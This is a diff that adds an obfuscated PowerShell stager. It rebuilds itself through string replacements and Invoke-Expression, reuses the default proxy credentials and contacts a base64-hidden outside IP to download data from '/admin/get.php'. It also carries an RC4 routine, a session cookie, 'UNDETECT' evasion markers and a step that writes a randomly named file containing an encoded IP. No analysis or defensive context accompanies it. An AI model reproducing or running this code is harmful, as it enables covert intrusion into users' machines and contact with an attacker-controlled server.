@@ -1,0 +1,46 @@
+ ('[SY'+'StEm.NeT.ServICEPoINtMAnaGEr]::ExpECT100CONTINuE=0;
+z'+'Evf94E=New-OBjeCT SystEM.NeT.WebCLIeNT;
+zEvu=AotMozilla 69Aot;
+zEvK=[SYStEM.Text.ENcOD'+'iNg]'+'::ASCII.GeTBytES'+'(Aota318e4507e5a74604aafb45e4741edd3Aot);'+'
+zEvser=zEv([TeXT.ENcoDiNG]::UnIc'+'Ode.GetSTring([CONV'+'ERT]::FroMBasE64S'+'TRINg(AotaAB0AHQAcAA6AC8ALw'+'AxADIALgA0ADgALgA'+'xADgANgAu'+'ADkAOAA6ADQANAAzAA==Aot)));
+zEvt=Aot/admi'+'n/get.phpAot;
+#-----UN'+'D'+'ETECT----
+
+zEvF94e.HEAders.ADD(AotUser-AgentAot,zEvu);
+zEvR={zEvD,zEv'+'K=zEvARgs;zEvS=0..255;0..2'+'55S3Q%{zEvJ=(zEvJ+zEvS[zEv_]+zEvK[zEv_%zEvK.CouNT])%256;zE'+'vS[zEv_],zEvS[zEvJ]=zEvS[zEv'+'J],zEvS[zEv_]};
+'+'zEvF94e.PROXY=[SyST'+'em.NEt.WebREQUest]::DEFaUltWEbPR'+'Oxy'+';
+zEvf94e.PROxY.CredentIaL'+'s = [SYsTem.NeT.CredENTiAlCACHe]::DEfAUlTNeTWORkC'+'RedEnTiaLs;
+zEvScript:Proxy = zEvf94e.Prox'+'y;
+zEvf94E.HEaderS.AdD(IwZCookieIwZ,IwZefgfCb=eIzFVdlUJJEWWhK8giBTzbpFtzs=IwZ);
+#-----UNDETECT-----
+
+zEvDS3Q%{zEvI'+'=(zEvI+1)%256;zEvH=(z'+'EvH+zEvS[zEvI])%256;zE'+'vS[zEvI],zEvS[zEvH]=zEvS[zEvH],zEvS[zEvI];zEv_-BxOrzEvS[(zEvS[zEvI]+zEvS[zEvH])%256]}};
+zEvhrjigxc = AotJwBpAHAAOgA=Aot;
+zEvtlrjpd = AotMQA2'+'ADUALgAx'+'ADUANgAuADgANQAuADQAMw'+'AnAA==Aot;'+'
+
+function fngo {
+    Param(
+   '+'     [Parameter(Mandatory=zEvTrue, Positi'+'o'+'n=0)]
+    '+'    [string] zEvwitnqoj,
+        [Par'+'ameter(Mandatory=zEvTrue, Position=1)]
+        [string] zEvdubjv,
+        [Parameter(Mandatory=zEvTrue, Positi'+'on=2)]
+'+'        [string] zEv'+'yogaqjh
+    )
+
+    zEvxndt = [Convert]::FromBase64String(zEvdub'+'jv)
+    z'+'Evcwi = [Convert]::FromBase64String(zEvyogaq'+'j'+'h)
+'+'    [IO.File]::WriteAllBytes(zEvwitnqoj, zEvxndt + zEvcwi)
+}
+zEvDa'+'tA=zEvF94e.DownLOadDATA(zEvsER+zEvT);
+'+'function jzrdce'+'() {
+    zEv'+'mqitld = Get-Ra'+'ndom -Min 3 -Max 5
+    zEvbilscwk = ([char[]]([char]97..[char]122))
+    zEvfimqitldame  = -join (zEvb'+'il'+'scwk S3Q Get-Ra'+'ndom -Count zEvmqitld S3Q % {[Char]zEv'+'_})'+'
+    return zEvfimq'+'itldame
+}
+
+zEvbzctaxd = jzrdce;
+fngo zEvbzctaxd zEvhrjigxc zEvtlrjpd;
+
+').REplaCE('S3Q','|').REplaCE('zEv','$').REplaCE(([ChaR]73+[ChaR]119+[ChaR]90),[sTrING][ChaR]34).REplaCE('Aot',[sTrING][ChaR]39) |&( $PshOmE[21]+$pSHoME[30]+'x')
